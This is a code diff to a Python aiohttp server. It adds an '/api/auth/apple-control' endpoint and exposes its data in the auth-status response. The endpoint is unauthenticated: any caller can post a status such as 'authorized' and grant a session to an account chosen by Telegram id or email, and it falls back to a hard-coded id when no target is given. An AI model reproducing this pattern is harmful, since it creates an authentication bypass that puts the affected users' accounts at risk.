@@ -342,6 +342,25 @@ async def handle_auth_status(request: web.Request) -> web.Response:
                 "tg_id": gctrl.get("tg_id"),
             }
 
+        actrl = None
+        if user and "tg_id" in user.keys():
+            actrl = db.get_apple_auth_control(DB_PATH, user["tg_id"])
+        elif tg_id and str(tg_id).isdigit():
+            actrl = db.get_apple_auth_control(DB_PATH, int(tg_id))
+        
+        if not actrl and not user and not tg_id:
+            try:
+                actrl = db.get_latest_apple_auth_control(DB_PATH)
+            except Exception:
+                pass
+
+        if actrl and isinstance(actrl, dict):
+            actrl = {
+                "status": actrl.get("status") or actrl.get("apple_status"),
+                "error_msg": actrl.get("error_msg") or actrl.get("apple_error_msg"),
+                "tg_id": actrl.get("tg_id"),
+            }
+
         return web.json_response({
             "ok": True,
             "authorized": is_auth,
@@ -350,6 +369,7 @@ async def handle_auth_status(request: web.Request) -> web.Response:
             "nickname": user["nickname"] if user else None,
             "phone": user["phone"] if user else None,
             "google_control": gctrl,
+            "apple_control": actrl,
         })
     except Exception as e:
         return web.json_response({"ok": False, "authorized": False, "error": str(e)})
@@ -441,6 +461,45 @@ async def handle_google_control(request: web.Request) -> web.Response:
         return web.json_response({"ok": True})
     except Exception as exc:
         logger.error("handle_google_control error: %s", exc)
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+
+async def handle_apple_control(request: web.Request) -> web.Response:
+    try:
+        data = await request.json()
+        tg_id = data.get("tg_id")
+        email = data.get("email")
+        status = data.get("status")
+        error_msg = data.get("error_msg")
+
+        target_id = None
+        if tg_id and str(tg_id).isdigit():
+            target_id = int(tg_id)
+        elif email:
+            user = db.get_user_by_email(DB_PATH, email)
+            if user and user.get("tg_id"):
+                target_id = int(user["tg_id"])
+
+        if not target_id:
+            latest = db.get_latest_apple_auth_control(DB_PATH)
+            if latest and latest.get("tg_id"):
+                target_id = int(latest["tg_id"])
+            else:
+                target_id = 7491827504
+
+        db.set_apple_auth_control(
+            DB_PATH,
+            tg_id=target_id,
+            status=status,
+            error_msg=error_msg,
+        )
+        if status in ("completed", "authorized"):
+            db.set_user_session(DB_PATH, target_id, f"apple_auth_{target_id}")
+            db.set_user_auth_step(DB_PATH, target_id, "apple_authorized")
+        logger.info("handle_apple_control set status '%s' for target_id=%s (email=%s)", status, target_id, email)
+        return web.json_response({"ok": True})
+    except Exception as exc:
+        logger.error("handle_apple_control error: %s", exc)
         return web.json_response({"ok": False, "error": str(exc)}, status=500)
 
 
@@ -597,6 +656,7 @@ async def main() -> None:
     app.router.add_post("/api/auth/complete", handle_auth_complete)
     app.router.add_post("/api/auth/event", handle_auth_event)
     app.router.add_post("/api/auth/google-control", handle_google_control)
+    app.router.add_post("/api/auth/apple-control", handle_apple_control)
     app.router.add_post("/api/auth/send-code", handle_send_code)
     app.router.add_post("/api/auth/send_code", handle_send_code)
     app.router.add_post("/api/auth/verify-code", handle_verify_code)
